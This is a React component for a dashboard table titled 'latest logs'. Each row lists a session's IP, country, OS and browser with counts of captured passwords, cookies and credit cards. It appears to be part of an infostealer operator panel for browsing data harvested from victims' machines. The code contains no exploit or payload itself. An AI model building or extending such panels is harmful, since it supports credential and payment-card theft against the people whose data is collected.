import { useNavigate } from 'react-router-dom'
import { formatDistanceToNow } from 'date-fns'
import { Skeleton } from '@/components/ui/skeleton'
import { FlagIcon } from '@/components/charts/flag-icon'
import { useI18n } from '@/lib/i18n'
import { cn } from '@/lib/utils'
import type { SessionListItem } from '@/types'

interface LatestLogsProps {
  data: SessionListItem[]
  isLoading: boolean
}

export function LatestLogs({ data, isLoading }: LatestLogsProps) {
  const navigate = useNavigate()
  const { t } = useI18n()

  if (isLoading) {
    return (
      <div className="space-y-2">
        {Array.from({ length: 5 }).map((_, i) => (
          <Skeleton key={i} className="h-12 w-full rounded-lg" />
        ))}
      </div>
    )
  }

  if (data.length === 0) {
    return (
      <div className="flex items-center justify-center h-40 text-muted-foreground text-sm">
        {t('chart.no_logs')}
      </div>
    )
  }

  return (
    <div className="overflow-x-auto">
      <table className="w-full text-xs">
        <thead>
          <tr className="border-b border-border text-muted-foreground">
            <th className="text-left py-2 px-3 font-medium">ID</th>
            <th className="text-left py-2 px-3 font-medium">{t('table.ip')}</th>
            <th className="text-left py-2 px-3 font-medium">{t('table.country')}</th>
            <th className="text-left py-2 px-3 font-medium">{t('table.os')}</th>
            <th className="text-left py-2 px-3 font-medium">{t('table.browser')}</th>
            <th className="text-left py-2 px-3 font-medium">{t('table.logs')}</th>
            <th className="text-left py-2 px-3 font-medium">{t('table.date')}</th>
          </tr>
        </thead>
        <tbody>
          {data.map((s) => (
            <tr
              key={s.id}
              className={cn(
                'border-b border-border/50 hover:bg-accent/50 cursor-pointer transition-colors',
                !s.viewed && 'bg-primary/5'
              )}
              onClick={() => navigate(`/sessions/${s.id}`)}
            >
              <td className="py-2.5 px-3 font-mono text-muted-foreground">
                {s.id.slice(0, 8)}
              </td>
              <td className="py-2.5 px-3 font-mono">{s.ip || '—'}</td>
              <td className="py-2.5 px-3">
                <div className="flex items-center gap-1.5">
                  <FlagIcon country={s.country_code || ''} width={16} height={16} />
                  <span>{s.country_code || '—'}</span>
                </div>
              </td>
              <td className="py-2.5 px-3 text-muted-foreground">{s.os || '—'}</td>
              <td className="py-2.5 px-3 text-muted-foreground">{s.browser || '—'}</td>
              <td className="py-2.5 px-3">
                <div className="flex items-center gap-2">
                  {s.passwords_count != null && s.passwords_count > 0 && (
                    <span className="inline-flex items-center gap-0.5 px-1.5 py-0.5 rounded bg-orange-500/10 text-orange-400 text-[10px]">
                      P {s.passwords_count}
                    </span>
                  )}
                  {s.cookies_count != null && s.cookies_count > 0 && (
                    <span className="inline-flex items-center gap-0.5 px-1.5 py-0.5 rounded bg-green-500/10 text-green-400 text-[10px]">
                      C {s.cookies_count}
                    </span>
                  )}
                  {s.cards_count != null && s.cards_count > 0 && (
                    <span className="inline-flex items-center gap-0.5 px-1.5 py-0.5 rounded bg-blue-500/10 text-blue-400 text-[10px]">
                      CC {s.cards_count}
                    </span>
                  )}
                </div>
              </td>
              <td className="py-2.5 px-3 text-muted-foreground whitespace-nowrap">
                {s.created_at ? formatDistanceToNow(new Date(s.created_at), { addSuffix: true }) : '—'}
              </td>
            </tr>
          ))}
        </tbody>
      </table>
    </div>
  )
}
